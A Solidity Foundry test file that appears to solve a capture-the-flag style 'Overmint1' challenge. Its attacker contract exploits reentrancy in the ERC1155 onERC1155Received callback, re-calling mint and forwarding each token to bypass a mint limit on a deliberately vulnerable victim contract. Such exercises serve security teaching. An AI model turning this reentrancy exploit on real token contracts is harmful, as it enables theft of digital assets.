// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Overmint1_ERC1155} from "./Overmint1-ERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Overmint1ERC115Attacker is Test {
    AttackerContract3 attackerContract;
    Overmint1_ERC1155 victim;

    address public attacker = address(0x10);

    function setUp() external {
        victim = new Overmint1_ERC1155();
    }

    function testAttackerContract() external {
        vm.startPrank(attacker);
        attackerContract = new AttackerContract3();
        attackerContract.callVictimsMint(address(victim));
        vm.stopPrank();

        assertEq(victim.success(attacker, 0), true);
        console.log(victim.balanceOf(attacker, 0));
        assertLt(vm.getNonce(attacker), 3);
        console.log(vm.getNonce(attacker));
    }
}

contract AttackerContract3 is IERC1155Receiver {
    address attackerAddress;

    function callVictimsMint(address victimsAddress) external {
        attackerAddress = msg.sender;
        Overmint1_ERC1155(victimsAddress).mint(0, "");
    }

    function onERC1155Received(address, address, uint256 id, uint256, bytes calldata)
        external
        override
        returns (bytes4)
    {
        if (Overmint1_ERC1155(msg.sender).balanceOf(attackerAddress, 0) < 5) {
            // each time received the nft, directly send to the attacker
            Overmint1_ERC1155(msg.sender).safeTransferFrom(address(this), attackerAddress, id, 1, "");
            Overmint1_ERC1155(msg.sender).mint(0, "");
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        override
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) public view override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}
